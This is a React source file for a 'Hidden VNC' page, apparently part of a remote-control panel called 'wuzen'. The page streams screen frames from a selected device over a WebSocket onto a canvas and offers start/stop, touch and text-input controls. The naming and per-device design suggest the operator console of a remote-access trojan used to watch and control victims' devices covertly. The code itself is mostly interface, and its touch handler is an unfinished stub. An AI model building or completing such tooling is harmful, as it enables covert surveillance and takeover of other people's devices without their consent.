import { useEffect, useRef, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import { useStore } from '../store'
import { Monitor, Play, Square, MousePointer, Type } from 'lucide-react'

export default function HiddenVncPage() {
  const { deviceId } = useParams()
  const canvasRef = useRef(null)
  const [streaming, setStreaming] = useState(false)
  const [fps, setFps] = useState(0)
  const { ws, wsConnected } = useStore()
  const frameCount = useRef(0)
  const lastTime = useRef(Date.now())

  useEffect(() => {
    if (!deviceId || !wsConnected) return

    const handleMessage = (e) => {
      const msg = JSON.parse(e.data)
      if (msg.type === 'vnc_frame' && msg.sourceDevice === deviceId) {
        const canvas = canvasRef.current
        if (!canvas) return
        const ctx = canvas.getContext('2d')
        const img = new Image()
        img.onload = () => {
          canvas.width = img.width
          canvas.height = img.height
          ctx.drawImage(img, 0, 0)
          frameCount.current++
          const now = Date.now()
          if (now - lastTime.current >= 1000) {
            setFps(frameCount.current)
            frameCount.current = 0
            lastTime.current = now
          }
        }
        img.src = msg.payload.frameData
      }
    }

    ws?.addEventListener('message', handleMessage)
    return () => ws?.removeEventListener('message', handleMessage)
  }, [deviceId, ws, wsConnected])

  const startStream = () => {
    if (!deviceId) return
    setStreaming(true)
  }

  const stopStream = () => {
    setStreaming(false)
  }

  const sendTouch = (e) => {
    if (!streaming || !deviceId) return
    const canvas = canvasRef.current
    const rect = canvas.getBoundingClientRect()
    const x = (e.clientX - rect.left) * (canvas.width / rect.width)
    const y = (e.clientY - rect.top) * (canvas.height / rect.height)
  }

  return (
    <div className="animate-fade-in">
      <PageHeader title="Hidden VNC" icon={Monitor} onDeviceChange={() => {}}>
        <div className="flex items-center gap-2">
          <span className="text-xs text-wuzen-muted font-mono">{fps} FPS</span>
          {streaming ? (
            <button onClick={stopStream} className="wuzen-btn-danger">
              <Square className="w-4 h-4" /> STOP
            </button>
          ) : (
            <button onClick={startStream} className="wuzen-btn-success">
              <Play className="w-4 h-4" /> START
            </button>
          )}
        </div>
      </PageHeader>

      <div className="wuzen-panel p-1 relative">
        <canvas
          ref={canvasRef}
          className="w-full h-[600px] bg-wuzen-bg rounded cursor-crosshair"
          onClick={sendTouch}
        />
        {!streaming && (
          <div className="absolute inset-0 flex items-center justify-center bg-wuzen-bg/80">
            <div className="text-center">
              <Monitor className="w-12 h-12 text-wuzen-muted mx-auto mb-3" />
              <p className="text-wuzen-muted">Stream not active</p>
              <p className="text-xs text-wuzen-muted mt-1">Select a device and click Start</p>
            </div>
          </div>
        )}
      </div>

      <div className="mt-4 flex gap-2">
        <button className="wuzen-btn border border-wuzen-border text-wuzen-muted text-xs">
          <MousePointer className="w-3 h-3" /> Touch Mode
        </button>
        <button className="wuzen-btn border border-wuzen-border text-wuzen-muted text-xs">
          <Type className="w-3 h-3" /> Text Input
        </button>
      </div>
    </div>
  )
}
